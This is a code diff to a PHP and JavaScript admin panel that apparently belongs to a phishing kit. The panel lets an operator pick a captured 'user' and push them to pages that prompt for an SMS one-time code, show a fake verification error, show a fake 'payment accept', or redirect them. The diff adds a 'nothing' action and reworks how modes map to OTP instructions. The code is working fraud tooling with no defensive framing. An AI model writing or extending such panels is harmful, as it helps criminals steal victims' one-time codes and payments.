@@ -77,10 +77,12 @@ if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
 $currentState = $selectedUserId !== '' ? panelLoadState($selectedUserId) : panelDefaults();
 $currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms';
 $currentSmsAction = 'show_sms_error';
-if ($currentState['mode'] === 'payment_accept' || $currentState['instruction'] === 'otp_pass') {
+if ($currentState['mode'] === 'payment_accept') {
     $currentSmsAction = 'show_payment_accept';
 } elseif ($currentState['mode'] === 'redirect_custom' || $currentState['mode'] === 'redirect_wait') {
     $currentSmsAction = 'redirection_url';
+} elseif ($currentState['mode'] === 'default' && $currentState['instruction'] === 'prompt_otp') {
+    $currentSmsAction = 'nothing';
 }
 $chatLog = $selectedUserId !== '' ? panelLoadChat($selectedUserId) : [];
 $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';
@@ -137,7 +139,7 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
                         </select>
                         <div class="row-hint">First choose where the user should be directed.</div></div>
                         <div class="row hidden" id="sms-actions-row"><label>SMS action</label><select id="sms_action" class="admin-select">
-                            <?php foreach (['show_sms_error'=>'Show SMS error','redirection_url'=>'Redirection URL','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
+                            <?php foreach (['nothing'=>'Nothing (SMS page only)','show_sms_error'=>'Show SMS error','redirection_url'=>'Redirection URL','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
                                 <option value="<?php echo $k; ?>" <?php echo $currentSmsAction===$k?'selected':''; ?>><?php echo $v; ?></option>
                             <?php endforeach; ?>
                         </select>
@@ -187,7 +189,7 @@ const customUrlField = document.getElementById('custom_url');
 function syncControlState(){
     if(!controlRoute||!smsModeField||!instructionField){return;}
     const route = controlRoute.value;
-    const action = smsAction ? smsAction.value : 'show_sms_error';
+    const action = smsAction ? smsAction.value : 'nothing';
     const isSmsRoute = route === 'sms';
     const showCustomUrl = isSmsRoute && action === 'redirection_url';
     const showCustomError = isSmsRoute && action === 'show_sms_error';
@@ -216,12 +218,13 @@ function syncControlState(){
     instructionField.value = 'prompt_otp';
     if(action === 'show_payment_accept'){
         smsModeField.value = 'payment_accept';
-        instructionField.value = 'otp_pass';
     } else if(action === 'redirection_url'){
         smsModeField.value = 'redirect_custom';
-    } else {
+    } else if(action === 'show_sms_error') {
         smsModeField.value = 'error_verification';
         instructionField.value = 'otp_error';
+    } else {
+        smsModeField.value = 'default';
     }
 }
 
